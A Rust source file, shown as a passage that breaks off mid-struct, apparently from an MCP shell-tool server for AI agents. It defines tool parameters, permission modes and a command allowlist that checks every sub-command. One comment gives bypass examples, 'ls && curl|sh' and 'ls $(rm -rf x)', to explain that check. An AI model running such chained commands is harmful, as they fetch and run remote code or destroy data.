use schemars::JsonSchema;
use serde::{Deserialize, Serialize};

pub fn normalize_thread_id(thread_id: &str) -> String {
    let filtered: String = thread_id.chars().filter(|c| c.is_alphanumeric() || *c == '_').collect();
    // If filtering removed characters, distinct ids could collapse to the same
    // form ("user-1" and "user1" both become "user1"), silently sharing one
    // session and one state file. Append a short, stable hash of the ORIGINAL so
    // distinct inputs stay distinct. Already-safe ids (the common case, incl.
    // generated `tid_*`) and ids that filter to empty are returned unchanged.
    if filtered.is_empty() || filtered == thread_id {
        filtered
    } else {
        format!("{filtered}_{:08x}", fnv1a_32(thread_id))
    }
}

/// Marker strings (literal or regex) that let `wait_for_turn` drive an arbitrary
/// interactive TUI without a hand-written recognizer. Loaded from the
/// `WINX_TURN_RECOGNIZER_CONFIG` env var (JSON) when the recognizer hint is
/// `configurable`. Each marker is matched case-insensitively; an invalid regex
/// falls back to a literal-substring match.
#[derive(Debug, Clone, Default, Deserialize)]
pub struct TurnRecognizerMarkers {
    /// Screen is actively working (scanned across the whole screen). E.g.
    /// `["esc to interrupt", "generating"]`.
    #[serde(default)]
    pub busy: Vec<String>,
    /// Screen is waiting for input (scanned in the tail). E.g. `["❯", "›"]`.
    #[serde(default)]
    pub awaiting_input: Vec<String>,
    /// Screen is asking for confirmation (scanned in the tail). E.g.
    /// `["do you want", "y/n"]`.
    #[serde(default)]
    pub awaiting_approval: Vec<String>,
}

impl TurnRecognizerMarkers {
    /// True when no markers are configured (nothing to recognize).
    pub fn is_empty(&self) -> bool {
        self.busy.is_empty() && self.awaiting_input.is_empty() && self.awaiting_approval.is_empty()
    }
}

/// FNV-1a 32-bit — a tiny, dependency-free hash that is stable across runs and
/// compiler versions (unlike `DefaultHasher`), so a normalized `thread_id`
/// resolves to the same session and state file after a server restart.
fn fnv1a_32(s: &str) -> u32 {
    let mut hash: u32 = 0x811c_9dc5;
    for byte in s.bytes() {
        hash ^= u32::from(byte);
        hash = hash.wrapping_mul(0x0100_0193);
    }
    hash
}

/// Type of shell environment initialization
///
/// This enum represents the different ways the Initialize tool can be called,
/// depending on the current state of the conversation and what the user is requesting.
#[derive(Debug, Serialize, Deserialize, JsonSchema, Clone, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum InitializeType {
    /// Initial call at the start of a conversation
    ///
    /// This should be used for the first Initialize call in a conversation.
    /// It sets up a new shell environment with the specified parameters.
    FirstCall,

    /// User requested to change the mode
    ///
    /// This should be used when the user asks to switch between modes
    /// (e.g., from "wcgw" to "architect" or "`code_writer`").
    UserAskedModeChange,

    /// Reset the shell environment due to issues
    ///
    /// This should be used when the shell environment appears to be in a bad state
    /// and needs to be reset to continue properly.
    ResetShell,

    /// User requested to change the workspace
    ///
    /// This should be used when the user asks to switch to a different
    /// workspace or project directory during the conversation.
    UserAskedChangeWorkspace,
}

#[derive(Debug, Clone, PartialEq)]
pub enum ModeName {
    Wcgw,
    Architect,
    CodeWriter,
}

// Custom serializer implementation to ensure values are properly quoted in JSON
impl Serialize for ModeName {
    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: serde::Serializer,
    {
        match self {
            ModeName::Wcgw => serializer.serialize_str("wcgw"),
            ModeName::Architect => serializer.serialize_str("architect"),
            ModeName::CodeWriter => serializer.serialize_str("code_writer"),
        }
    }
}

// Custom deserializer to support multiple aliases
impl<'de> Deserialize<'de> for ModeName {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let s = String::deserialize(deserializer)?;
        match s.as_str() {
            "wcgw" => Ok(ModeName::Wcgw),
            "architect" => Ok(ModeName::Architect),
            "code_writer" | "code_write" | "code-writer" => Ok(ModeName::CodeWriter),
            _ => Err(serde::de::Error::custom(format!("Unknown mode name: {s}"))),
        }
    }
}

// Implement schema generation for JSON schema since we removed the derive
impl JsonSchema for ModeName {
    fn schema_name() -> std::borrow::Cow<'static, str> {
        "ModeName".into()
    }

    fn json_schema(_gen: &mut schemars::SchemaGenerator) -> schemars::Schema {
        schemars::Schema::new_ref("#/definitions/ModeName".to_string())
    }
}

#[derive(Debug, Serialize, Deserialize, JsonSchema, Clone, PartialEq, Default)]
pub struct CodeWriterConfig {
    #[serde(default)]
    pub allowed_globs: AllowedGlobs,
    #[serde(default)]
    pub allowed_commands: AllowedCommands,
}

impl CodeWriterConfig {
    pub fn update_relative_globs(&mut self, workspace_root: &str) {
        // Only process if we have a list of globs
        if let AllowedGlobs::List(globs) = &self.allowed_globs {
            let updated_globs = globs
                .iter()
                .map(|glob| {
                    if std::path::Path::new(glob).is_absolute() {
                        glob.clone()
                    } else {
                        format!("{workspace_root}/{glob}")
                    }
                })
                .collect();

            self.allowed_globs = AllowedGlobs::List(updated_globs);
        }
    }
}

#[derive(Debug, Serialize, Deserialize, JsonSchema, Clone, PartialEq)]
#[serde(untagged)]
pub enum AllowedGlobs {
    All(String),
    List(Vec<String>),
}

impl Default for AllowedGlobs {
    fn default() -> Self {
        AllowedGlobs::All("all".to_string())
    }
}

impl AllowedGlobs {
    /// Collapse the common LLM mistake `["all"]` into the wildcard `All("all")`.
    /// Without this, a literal glob named "all" would be the only allowed path.
    pub fn normalize(&mut self) {
        if let AllowedGlobs::List(items) = self {
            if items.len() == 1 && items[0] == "all" {
                *self = AllowedGlobs::All("all".to_string());
            }
        }
    }

    #[allow(dead_code)]
    pub fn is_allowed(&self, path: &str) -> bool {
        match self {
            AllowedGlobs::All(s) if s == "all" => true,
            AllowedGlobs::List(globs) => globs.iter().any(|g| match glob::Pattern::new(g) {
                Ok(pattern) => pattern.matches(path),
                Err(_) => false,
            }),
            AllowedGlobs::All(_) => false,
        }
    }
}

#[derive(Debug, Serialize, Deserialize, JsonSchema, Clone, PartialEq)]
#[serde(untagged)]
pub enum AllowedCommands {
    All(String),
    List(Vec<String>),
}

impl Default for AllowedCommands {
    fn default() -> Self {
        AllowedCommands::All("all".to_string())
    }
}

impl AllowedCommands {
    /// Collapse the common LLM mistake `["all"]` into the wildcard `All("all")`.
    pub fn normalize(&mut self) {
        if let AllowedCommands::List(items) = self {
            if items.len() == 1 && items[0] == "all" {
                *self = AllowedCommands::All("all".to_string());
            }
        }
    }

    pub fn is_allowed(&self, command_line: &str) -> bool {
        match self {
            AllowedCommands::All(s) if s == "all" => true,
            AllowedCommands::All(_) => false,
            AllowedCommands::List(commands) => {
                // Enforce the allowlist against EVERY command the line would run
                // (pipelines, &&/||/;, command & process substitution, subshells),
                // not just the first whitespace token — which `ls && curl|sh` and
                // `ls $(rm -rf x)` trivially bypassed. A parse failure is fail
                // closed: a restricted mode must not run what it can't vet.
                match crate::utils::bash_parser::extract_command_texts(command_line) {
                    Ok(cmds) if !cmds.is_empty() => cmds
                        .iter()
                        .all(|cmd| commands.iter().any(|allowed| command_has_prefix(cmd, allowed))),
                    _ => false,
                }
            }
        }
    }
}

/// Whether `cmd` is the allowlist entry `allowed` or a sub-invocation of it,
/// enforcing a word boundary so `ls` does not also permit `lsof`, and
/// `cargo test` does not permit `cargo testimony`.
fn command_has_prefix(cmd: &str, allowed: &str) -> bool {
    let cmd = cmd.trim();
    let allowed = allowed.trim();
    if allowed.is_empty() {
        return false;
    }
    cmd == allowed
        || cmd.strip_prefix(allowed).is_some_and(|rest| rest.starts_with(char::is_whitespace))
}

/// Parameters for initializing the shell environment
///
/// This struct represents the parameters needed to initialize or update the shell environment.
/// It is used by the Initialize tool, which must be called before any other shell tools.
#[derive(Debug, Serialize, Deserialize, JsonSchema, Clone)]
pub struct Initialize {
    /// Initialization type, indicating the purpose of the call
    ///
    /// - `FirstCall`: Initial setup for a new conversation
    /// - `UserAskedModeChange`: User requested to change the mode during a conversation
    /// - `ResetShell`: Reset the shell if it's not working properly
    /// - `UserAskedChangeWorkspace`: User requested to change the workspace during a conversation
    #[serde(rename = "type")]
    #[serde(default = "default_init_type")]
    pub init_type: InitializeType,

    /// Path to the workspace directory or file
    ///
    /// This can be an absolute path or a path relative to the current directory.
    /// If it's a file, the parent directory will be used as the workspace.
    /// If it doesn't exist and is an absolute path, it will be created.
    /// If it's a relative path and doesn't exist, an error will be returned.
    pub any_workspace_path: String,

    /// List of files to read initially
    ///
    /// These files can be absolute paths or paths relative to the workspace.
    /// They will be read and their contents provided in the response.
    #[serde(default)]
    pub initial_files_to_read: Vec<String>,

    /// ID of a task to resume
    ///
    /// If provided during a `first_call`, the task with this ID will be resumed.
    /// This allows continuing a conversation from a previous session.
    #[serde(default = "String::new")]
    #[serde(deserialize_with = "deserialize_string_or_null")]
    pub task_id_to_resume: String,

    /// Mode name for the shell environment
    ///
    /// - `wcgw`: Full permissions (default)
    /// - `architect`: Restricted permissions, read-only
    /// - `code_writer`: Custom permissions for code writing
    #[serde(default = "default_mode_name")]
    pub mode_name: ModeName,

    /// ID of the thread session
    ///
    /// If not provided for a `first_call`, a new ID will be generated.
    /// This ID must be included in all subsequent tool calls.
    #[serde(default)]
    #[serde(deserialize_with = "deserialize_string_or_null")]
    pub thread_id: String,

    /// Configuration for `code_writer` mode
    ///
    /// Only used when `mode_name` is "`code_writer`".
    /// Specifies allowed commands and file globs for writing/editing.
    #[serde(default)]
    #[serde(deserialize_with = "deserialize_code_writer_config")]
    pub code_writer_config: Option<CodeWriterConfig>,
}

// Custom deserializer for strings that might be null
fn deserialize_string_or_null<'de, D>(deserializer: D) -> Result<String, D::Error>
where
    D: serde::Deserializer<'de>,
{
    // First try to deserialize as a string
    let result = serde_json::Value::deserialize(deserializer)?;

    match result {
        // Return empty string for null values
        serde_json::Value::Null => Ok(String::new()),
        // If it's a string, use that
        serde_json::Value::String(s) => {
            // Handle "null" string specially
            if s == "null" {
                Ok(String::new())
            } else {
                Ok(s)
            }
        }
        // Otherwise try to convert to a string
        _ => match serde_json::to_string(&result) {
            Ok(s) => Ok(s),
            Err(_) => Ok(String::new()),
        },
    }
}

// Custom deserializer for code_writer_config that handles the "null" string case
fn deserialize_code_writer_config<'de, D>(
    deserializer: D,
) -> Result<Option<CodeWriterConfig>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    // This handles multiple possible input types
    let value = serde_json::Value::deserialize(deserializer)?;

    match value {
        // If it's explicitly null or the string "null", return None
        serde_json::Value::Null => Ok(None),
        serde_json::Value::String(s) if s == "null" => Ok(None),
        // Otherwise try to parse it as CodeWriterConfig
        _ => {
            match serde_json::from_value::<CodeWriterConfig>(value.clone()) {
                Ok(config) => {
                    tracing::debug!("Successfully parsed CodeWriterConfig: {:?}", config);
                    Ok(Some(config))
                }
                Err(e) => {
                    // Fail loud. A malformed restricted-mode config must NOT silently
                    // degrade to `None` — `None` falls back to All commands / All globs,
                    // so the model would believe the shell is locked down while it is in
                    // fact wide open. Refuse to initialize instead.
                    tracing::error!("Failed to parse CodeWriterConfig: {}. Value: {}", e, value);
                    Err(serde::de::Error::custom(format!(
                        "Invalid code_writer config: {e}. Refusing to start with a permissive \
                         fallback — fix the allowed_commands / allowed_globs shape (or pass null \
                         to opt out explicitly)."
                    )))
                }
            }
        }
    }
}

/// Default `mode_name` for Initialize
fn default_mode_name() -> ModeName {
    ModeName::Wcgw
}

/// Default `init_type` for Initialize
fn default_init_type() -> InitializeType {
    InitializeType::FirstCall
}

// Mode types
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum Modes {
    Wcgw,
    Architect,
    CodeWriter,
}

/// Convert the wire-level `ModeName` (parsed from the `Initialize` request, with
/// its alias spellings) into the runtime `Modes`. Done as `From` rather than a
/// hand-written `convert_mode_name` so the compiler enforces that every `ModeName`
/// variant maps to a `Modes` one — adding a variant to either enum without the
/// other becomes a compile error here.
impl From<&ModeName> for Modes {
    fn from(name: &ModeName) -> Self {
        match name {
            ModeName::Wcgw => Modes::Wcgw,
            ModeName::Architect => Modes::Architect,
            ModeName::CodeWriter => Modes::CodeWriter,
        }
    }
}

impl std::fmt::Display for Modes {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Modes::Wcgw => write!(f, "wcgw"),
            Modes::Architect => write!(f, "architect"),
            Modes::CodeWriter => write!(f, "code_writer"),
        }
    }
}

// Implement schema generation for Modes
impl JsonSchema for Modes {
    fn schema_name() -> std::borrow::Cow<'static, str> {
        "Modes".into()
    }

    fn json_schema(_gen: &mut schemars::SchemaGenerator) -> schemars::Schema {
        schemars::Schema::new_ref("#/definitions/Modes".to_string())
    }
}

/// Special key types for shell interaction
/// Matches wcgw Python's Specials enum exactly
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
pub enum SpecialKey {
    Enter,
    #[serde(rename = "Key-up")]
    KeyUp,
    #[serde(rename = "Key-down")]
    KeyDown,
    #[serde(rename = "Key-left")]
    KeyLeft,
    #[serde(rename = "Key-right")]
    KeyRight,
    #[serde(rename = "Ctrl-c")]
    CtrlC,
    #[serde(rename = "Ctrl-d")]
    CtrlD,
    #[serde(rename = "Ctrl-z")]
    CtrlZ,
}

/// Parameters for the `ReadFiles` tool
///
/// This struct represents the parameters needed to read one or more files.
/// Line ranges can be specified in the path itself (e.g., "file.rs:10-20").
#[derive(Debug, Clone, Serialize, JsonSchema)]
pub struct ReadFiles {
    /// List of file paths to read.
    /// Supports line range syntax: "file.rs:10-20" for lines 10-20,
    /// "file.rs:10-" for line 10 onwards, "file.rs:-20" for first 20 lines.
    pub file_paths: Vec<String>,

    /// Optional thread ID identifying the shell session to operate on. When
    /// omitted, the most recently active session is used.
    #[serde(default)]
    pub thread_id: String,

    // Internal fields - not part of MCP schema (parsed from file_paths)
    #[serde(skip)]
    #[schemars(skip)]
    pub start_line_nums: Vec<Option<usize>>,

    #[serde(skip)]
    #[schemars(skip)]
    pub end_line_nums: Vec<Option<usize>>,
}

// Custom deserializer for ReadFiles - parses line ranges from file paths like wcgw Python
impl<'de> Deserialize<'de> for ReadFiles {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        #[derive(Deserialize)]
        struct ReadFilesHelper {
            file_paths: Option<Vec<String>>,
            #[serde(default)]
            thread_id: Option<String>,
        }

        let input = serde_json::Value::deserialize(deserializer)?;

        if !input.is_object() {
            if input.is_null() {
                return Err(serde::de::Error::custom("Cannot convert null to ReadFiles object."));
            }
            return Err(serde::de::Error::custom(format!("Expected object, got {input}")));
        }

        let helper: ReadFilesHelper = serde_json::from_value(input)
            .map_err(|e| serde::de::Error::custom(format!("Failed to parse ReadFiles: {e}")))?;

        let thread_id = helper.thread_id.unwrap_or_default();
        let file_paths = match helper.file_paths {
            Some(paths) if !paths.is_empty() => paths,
            Some(_) => return Err(serde::de::Error::custom("file_paths must not be empty.")),
            None => return Err(serde::de::Error::custom("file_paths is required.")),
        };

        // Parse line ranges from file paths (like wcgw Python's model_post_init)
        let mut clean_file_paths = Vec::with_capacity(file_paths.len());
        let mut start_line_nums = Vec::with_capacity(file_paths.len());
        let mut end_line_nums = Vec::with_capacity(file_paths.len());

        for path in file_paths {
            let (clean_path, start, end) = parse_file_path_with_line_range(&path);
            clean_file_paths.push(clean_path);
            start_line_nums.push(start);
            end_line_nums.push(end);
        }

        Ok(ReadFiles { file_paths: clean_file_paths, thread_id, start_line_nums, end_line_nums })
    }
}

fn parse_file_path_with_line_range(path: &str) -> (String, Option<usize>, Option<usize>) {
    let Some((potential_path, line_spec)) = path.rsplit_once(':') else {
        return (path.to_string(), None, None);
    };

    let Some((start, end)) = parse_line_spec(line_spec) else {
        return (path.to_string(), None, None);
    };

    (potential_path.to_string(), start, end)
}

fn parse_line_spec(line_spec: &str) -> Option<(Option<usize>, Option<usize>)> {
    if line_spec.chars().all(|c| c.is_ascii_digit()) {
        return line_spec.parse().ok().map(|line| (Some(line), None));
    }

    let (start, end) = line_spec.split_once('-')?;

    if start.is_empty() && !end.is_empty() && end.chars().all(|c| c.is_ascii_digit()) {
        return end.parse().ok().map(|line| (None, Some(line)));
    }

    if !start.is_empty()
        && start.chars().all(|c| c.is_ascii_digit())
        && (end.is_empty() || end.chars().all(|c| c.is_ascii_digit()))
    {
        let start = start.parse().ok()?;
        let end = if end.is_empty() { None } else { Some(end.parse().ok()?) };
        return Some((Some(start), end));
    }

    None
}

impl ReadFiles {
    /// Line numbers are always shown (like wcgw Python)
    pub fn show_line_numbers(&self) -> bool {
        true
    }

    /// Get the clean file path without line range suffix
    pub fn get_clean_path(&self, index: usize) -> String {
        parse_file_path_with_line_range(&self.file_paths[index]).0
    }
}

/// Default true value for `status_check`
fn default_true() -> bool {
    true
}

/// Types of actions that can be performed with the `BashCommand` tool
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum BashCommandAction {
    /// Execute a shell command
    Command {
        command: String,
        #[serde(default)]
        is_background: bool,
        /// Opt out of the single-top-level-statement guard. By default winx
        /// rejects multi-statement commands (`a; b`, `a && b; c`, etc.) so the
        /// agent has to be explicit about what it's running. Set this to true
        /// when you knowingly want to run a composite command without
        /// wrapping it in `bash -lc '...'`.
        #[serde(default)]
        allow_multi: bool,
    },

    /// Check the status of a running command.
    ///
    /// By default returns only what changed since the previous call — agents
    /// driving long-lived TUIs do not need the cumulative buffer on every poll.
    /// Set `verbose: true` to receive a fresh snapshot regardless of the dedup
    /// hash, or `scrollback_lines: Some(N)` to also pull the last N lines from
    /// the PTY ringbuffer.
    StatusCheck {
        #[serde(default = "default_true")]
        status_check: bool,
        bg_command_id: Option<String>,
        #[serde(default)]
        scrollback_lines: Option<usize>,
        #[serde(default)]
        verbose: bool,
    },

    /// Send text to a running command. Set `submit` to true to append a carriage
    /// return after the bytes so the target program receives the input as a
    /// completed line (matches what hitting Enter would do in a TUI).
    SendText {
        send_text: String,
        bg_command_id: Option<String>,
        #[serde(default)]
        submit: bool,
    },

    /// Send special keys to a running command. `submit` works the same as in
    /// `SendText`.
    SendSpecials {
        send_specials: Vec<SpecialKey>,
        bg_command_id: Option<String>,
        #[serde(default)]
        submit: bool,
    },

    /// Send ASCII characters to a running command. `submit` works the same as in
    /// `SendText`.
    SendAscii {
        send_ascii: Vec<u8>,
        bg_command_id: Option<String>,
        #[serde(default)]
        submit: bool,
    },

    /// Snapshot the live, stable screen of a shell's terminal: the consolidated
    /// view a human would see right now (cursor moves, redraws, alternate-screen
    /// and synchronized-output already applied), ANSI stripped. Unlike
    /// `status_check`, it never stacks redraw generations and never waits — a
    /// point-in-time photo, ideal for reading an interactive TUI's current frame
    /// (the `claude` CLI, vim, htop, fzf).
    Screen {
        #[serde(default = "default_true")]
        screen: bool,
        bg_command_id: Option<String>,
        /// Last N visible lines to return (0 or omitted = full screen buffer).
        #[serde(default)]
        lines: Option<usize>,
        /// When true, return only the lines that CHANGED since the last `screen`
        /// look (big token savings when polling a TUI frame-by-frame) instead of
        /// the whole frame. First look, or a large change, still returns full.
        #[serde(default)]
        diff: bool,
    },

    /// Block until an interactive TUI finishes its turn and is ready for input.
    /// Combines generic quiescence (the screen stopped changing for `quiet_ms`)
    /// with a per-app recognizer, then returns the stable snapshot plus the
    /// detected turn state (`busy` / `awaiting_input` / `awaiting_approval`).
    WaitForTurn {
        #[serde(default = "default_true")]
        wait_for_turn: bool,
        bg_command_id: Option<String>,
        /// Recognizer hint: `auto` (default), `claude`, `codex`, `antigravity`
        /// (aka `agy`) or `generic`.
        #[serde(default)]
        recognizer: Option<String>,
        /// Quiet window in ms — the screen must be unchanged this long to count
        /// as idle (default 600).
        #[serde(default)]
        quiet_ms: Option<u64>,
        /// Hard cap in seconds before returning regardless (default 30).
        #[serde(default)]
        timeout_seconds: Option<f32>,
        /// Visible lines to return in the final snapshot (0 or omitted = full).
        #[serde(default)]
        lines: Option<usize>,
        /// By default `wait_for_turn` returns as soon as it confirms the app is
        /// actively working (`busy`), instead of blocking until the turn ends or
        /// `timeout_seconds` elapses — so a long-running child never pins the
        /// caller for the whole cap (poll again to keep watching). Set this to
        /// true for the old behavior: block *through* `busy` until the app is
        /// ready for input (or the timeout fires).
        #[serde(default)]
        wait_through_busy: bool,
    },
}

/// Parameters for the `BashCommand` tool
#[derive(Debug, Clone, Serialize, JsonSchema)]
pub struct BashCommand {
    /// The action to perform (command, status check, etc.)
    pub action_json: BashCommandAction,

    /// Optional timeout in seconds to wait for command completion
    #[serde(default)]
    #[serde(skip_serializing_if = "Option::is_none")]
    pub wait_for_seconds: Option<f32>,

    /// The thread ID for this session
    #[serde(default)]
    pub thread_id: String,
}

// Custom deserialization for BashCommand to handle string-encoded action_json
impl<'de> Deserialize<'de> for BashCommand {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let input = serde_json::Value::deserialize(deserializer)?;
        let serde_json::Value::Object(mut map) = input else {
            return Err(serde::de::Error::custom("BashCommand parameters must be an object."));
        };

        let wait_for_seconds = map
            .remove("wait_for_seconds")
            .map(serde_json::from_value)
            .transpose()
            .map_err(serde::de::Error::custom)?;
        let thread_id = map
            .remove("thread_id")
            .map(thread_id_from_value)
            .transpose()
            .map_err(serde::de::Error::custom)?
            .unwrap_or_default();
        let action_json_value = map.remove("action_json").unwrap_or(serde_json::Value::Object(map));

        // Process action_json which could be a string or an object
        let action_json = match action_json_value {
            serde_json::Value::String(s) => {
                // If it's a string, normalize newlines and try to parse it as JSON
                // Replace literal newlines with space to avoid JSON parsing errors
                let sanitized = s.replace('\n', " ");
                match serde_json::from_str(&sanitized) {
                    Ok(json) => normalize_action_json(json),
                    Err(e) => {
                        // If strict JSON parsing fails, try to be more lenient
                        // For commands containing literal newlines, just wrap the string in a command object
                        tracing::warn!(
                            "Failed to parse action_json as JSON, trying fallback: {}",
                            e
                        );

                        // Check for common JSON syntax issues
                        if s.contains("command") && s.contains('{') && s.contains('}') {
                            // It looks like JSON but has issues, let's try to sanitize it

                            // Detailed error for troubleshooting
                            tracing::debug!("JSON parse error on: {}", s);

                            // Common issues: unescaped quotes, newlines, tabs
                            let re_sanitized = s
                                .replace('\n', "\\n") // Replace newlines with escaped newlines
                                .replace('\r', "\\r") // Replace carriage returns with escaped versions
                                .replace('\t', "\\t"); // Replace tabs with escaped versions

                            // Attempt to fix unquoted field values (e.g., convert {field: value} to {"field": "value"})
                            let re_sanitized = if !s.contains('"') && s.contains(':') {
                                // Very likely unquoted keys/values
                                tracing::debug!("Attempting to fix unquoted JSON keys/values");
                                re_sanitized
                            } else {
                                re_sanitized
                            };

                            match serde_json::from_str(&re_sanitized) {
                                Ok(json) => normalize_action_json(json),
                                Err(err) => {
                                    // Log the specific parsing error for debugging
                                    tracing::error!("Secondary JSON parse error: {}", err);
                                    // Last resort fallback - assume it's a command string
                                    // MUST include "type": "command" for serde tagged enum
                                    serde_json::json!({"type": "command", "command": sanitize_shell_string(&s)})
                                }
                            }
                        } else {
                            // Assume it's a simple command string
                            // MUST include "type": "command" for serde tagged enum
                            tracing::info!("Treating as simple command: {}", s);
                            serde_json::json!({"type": "command", "command": sanitize_shell_string(&s)})
                        }
                    }
                }
            }
            // If it's already an object or other JSON value, normalize legacy
            // WCGW-style shorthand such as {"command": "..."}.
            value => normalize_action_json(value),
        };

        // Now deserialize the action_json to our BashCommandAction enum
        let mut action: BashCommandAction =
            serde_json::from_value(action_json.clone()).map_err(|e| {
// Log both the error and the problematic JSON for debugging
tracing::error!(
    "Failed to deserialize action_json to BashCommandAction: {}\nProblematic JSON: {}",
    e,
    action_json
);

// For the SyntaxError: Unexpected token case
let err_str = e.to_string();
if err_str.contains("unexpected token") || err_str.contains("Unexpected token") {
    return serde::de::Error::custom(format!(
        "JSON syntax error: {e}. Please check your JSON structure. Each field name should be in quotes, and string values should be in quotes."
    ));
}

serde::de::Error::custom(format!("Invalid action_json: {e}. Please ensure your JSON is properly formatted."))
        })?;

        // Return the properly constructed BashCommand
        Ok(BashCommand {
            action_json: action,
            wait_for_seconds,
            thread_id: normalize_thread_id(&thread_id),
        })
    }
}

fn thread_id_from_value(value: serde_json::Value) -> std::result::Result<String, String> {
    match value {
        serde_json::Value::Null => Ok(String::new()),
        serde_json::Value::String(value) => Ok(value),
        other => Err(format!("thread_id must be a string or null, got {other}")),
    }
}

fn normalize_action_json(mut value: serde_json::Value) -> serde_json::Value {
    let serde_json::Value::Object(map) = &mut value else {
        return value;
    };

    if let Some(serde_json::Value::String(command)) = map.get_mut("command") {
        *command = sanitize_shell_string(command);
    }

    if map.contains_key("type") {
        return value;
    }

    let inferred_type = if map.contains_key("command") {
        Some("command")
    } else if map.contains_key("status_check") {
        Some("status_check")
    } else if map.contains_key("send_text") {
        Some("send_text")
    } else if map.contains_key("send_specials") {
        Some("send_specials")
    } else if map.contains_key("send_ascii") {
        Some("send_ascii")
    } else if map.contains_key("screen") {
        Some("screen")
    } else if map.contains_key("wait_for_turn") {
        Some("wait_for_turn")
    } else {
        None
    };

    if let Some(action_type) = inferred_type {
        map.insert("type".to_string(), serde_json::Value::String(action_type.to_string()));
    }

    value
}

fn sanitize_shell_string(value: &str) -> String {
    value.replace('\0', "\\x00")
}

// Bash command mode
#[derive(Debug, Clone, JsonSchema, PartialEq)]
pub struct BashCommandMode {
    pub bash_mode: BashMode,
    pub allowed_commands: AllowedCommands,
}

#[derive(Debug, Clone, Copy, JsonSchema, PartialEq)]
pub enum BashMode {
    NormalMode,
    RestrictedMode,
}

// File edit mode
#[derive(Debug, Clone, JsonSchema, PartialEq)]
pub struct FileEditMode {
    pub allowed_globs: AllowedGlobs,
}

// Write if empty mode
#[derive(Debug, Clone, JsonSchema, PartialEq)]
pub struct WriteIfEmptyMode {
    pub allowed_globs: AllowedGlobs,
}

/// Parameters for the `FileWriteOrEdit` tool
///
/// This struct represents the parameters needed to write or edit a file
/// with optional search/replace blocks for partial edits.
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct FileWriteOrEdit {
    /// Path to the file to write or edit
    ///
    /// This must be an absolute path (~ allowed).
    pub file_path: String,

    /// Percentage of the file that will be changed
    ///
    /// If > 50%, the content is treated as the entire file content.
    /// If <= 50%, the content is treated as search/replace blocks.
    pub percentage_to_change: u32,

    /// Content for the file or search/replace blocks
    ///
    /// If `percentage_to_change` > 50%, this is the entire file content.
    /// If `percentage_to_change` <= 50%, this contains search/replace blocks
    /// in the format:
    /// ```text
    /// <<<<<<< SEARCH
    /// old content to find
    /// =======
    /// new content to replace with
    /// >>>>>>> REPLACE
    /// ```
    pub text_or_search_replace_blocks: String,

    /// The thread ID for this session
    pub thread_id: String,
}

/// One file's worth of edits in a [`MultiFileEdit`] batch. Same semantics as the
/// corresponding [`FileWriteOrEdit`] fields.
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct FileEditEntry {
    /// Path to the file to write or edit (absolute, ~ allowed).
    pub file_path: String,
    /// If > 50%, the content is the entire file; if <= 50%, search/replace blocks.
    pub percentage_to_change: u32,
    /// Full file content or search/replace blocks (see `FileWriteOrEdit`).
    pub text_or_search_replace_blocks: String,
}

/// Parameters for the `MultiFileEdit` tool: apply edits across several files
/// all-or-nothing at the COMPUTE stage.
///
/// Every file is validated and its new content computed in memory first; only
/// if ALL succeed are any writes performed. So a SEARCH that fails to match in
/// the last file leaves the first files untouched. The write stage is a sequence
/// of atomic single-file renames and stops at the first I/O failure (already
/// written files are not rolled back, which is reported clearly).
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct MultiFileEdit {
    /// Two or more files to edit together. For a single file use `FileWriteOrEdit`.
    pub files: Vec<FileEditEntry>,

    /// The thread ID for this session
    pub thread_id: String,
}

/// Parameters for the `UndoEdit` tool: revert a file to its content before the
/// last `FileWriteOrEdit`/`MultiFileEdit` in this session.
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct UndoEdit {
    /// Path of the file whose last edit should be reverted (absolute, ~ allowed).
    pub file_path: String,

    /// The thread ID for this session
    pub thread_id: String,
}

/// Parameters for the `ContextSave` tool
///
/// This struct represents the parameters needed to save context information
/// about a task, including file contents from specified globs.
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct ContextSave {
    /// Unique identifier for the task
    ///
    /// This should be a unique string that identifies the task. It can be
    /// a random 3-word identifier or a user-provided value.
    pub id: String,

    /// Root path of the project
    ///
    /// This should be an absolute path to the project root. If empty, no
    /// project root will be used.
    pub project_root_path: String,

    /// Description of the task
    ///
    /// This should contain a detailed description of the task, including
    /// relevant context, problems, and objectives.
    pub description: String,

    /// List of file glob patterns
    ///
    /// These glob patterns identify the files that should be included in
    /// the saved context. Patterns can be absolute or relative to the project root.
    pub relevant_file_globs: Vec<String>,

    /// Optional thread ID identifying the shell session to operate on. When
    /// omitted, the most recently active session is used.
    #[serde(default)]
    pub thread_id: String,
}

/// Parameters for the `ReadImage` tool
///
/// This struct represents the parameters needed to read an image file.
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct ReadImage {
    /// Path to the image file to read
    ///
    /// This can be an absolute path or a path relative to the current working directory.
    pub file_path: String,

    /// Optional thread ID identifying the shell session to operate on. When
    /// omitted, the most recently active session is used.
    #[serde(default)]
    pub thread_id: String,
}

/// Operation for the `CodeMap` tool.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, JsonSchema, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum CodeMapOperation {
    /// A file's symbol definitions, or a ranked repo-wide symbol map for a directory.
    Outline,
    /// The definition + reference (call/use) sites of a symbol name across the repo.
    References,
}

/// Parameters for the `CodeMap` tool: tree-sitter code navigation. One tool with
/// two operations, in place of separate `Outline` / `FindReferences` tools.
#[derive(Debug, Clone, Serialize, Deserialize, JsonSchema)]
pub struct CodeMap {
